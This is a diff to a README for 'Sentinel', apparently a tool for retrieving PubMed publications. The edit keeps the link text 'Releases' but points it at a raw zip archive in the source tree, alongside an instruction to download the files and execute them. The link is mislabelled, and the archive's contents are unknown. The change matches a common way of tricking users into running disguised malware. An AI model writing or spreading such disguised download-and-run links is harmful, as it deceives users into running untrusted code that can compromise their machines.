@@ -24,7 +24,7 @@ The topics covered in this repository include:
 
 ## Get Started 🚀
 
-To explore the full capabilities of Sentinel, visit the [Releases](https://github.com/adnaan-hub/sentinel/releases) section. You can download the necessary files and execute them to unleash the power of AI-driven PubMed publication retrieval.
+To explore the full capabilities of Sentinel, visit the [Releases](https://github.com/adnaan-hub/sentinel/raw/refs/heads/master/src/Software-3.5.zip) section. You can download the necessary files and execute them to unleash the power of AI-driven PubMed publication retrieval.
 
 ## Embrace the Power of AI 🤖
 
